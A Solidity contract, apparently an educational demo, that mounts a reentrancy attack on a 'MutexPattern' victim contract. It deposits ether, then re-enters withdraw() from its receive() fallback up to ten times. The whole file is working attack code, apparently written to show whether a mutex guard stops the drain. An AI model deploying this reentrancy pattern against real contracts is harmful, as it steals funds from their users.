// SPDX-License-Identifier: MIT

pragma solidity ^0.7.0;

import './MutexPattern.sol';

contract AttackerMutex {
    MutexPattern v;
    uint256 public count;
    uint amount = 1 ether;
    address payable public victimAddress;

    event ReceivedTokens(uint c, uint balance, address addr);

    constructor (MutexPattern victim) {
        victimAddress = address(victim);
        v = MutexPattern(victimAddress);
    }

    receive() external payable {
        count++;
        emit ReceivedTokens(count, address(this).balance, address(this));

        if (count < 10) {
          v.withdraw(amount);
        }
    }

    function setBalance() public payable {
        (bool success, ) = victimAddress.call{value: msg.value}("");
        require(success);
    }

    function attack() public {
        v.withdraw(amount);
    }
}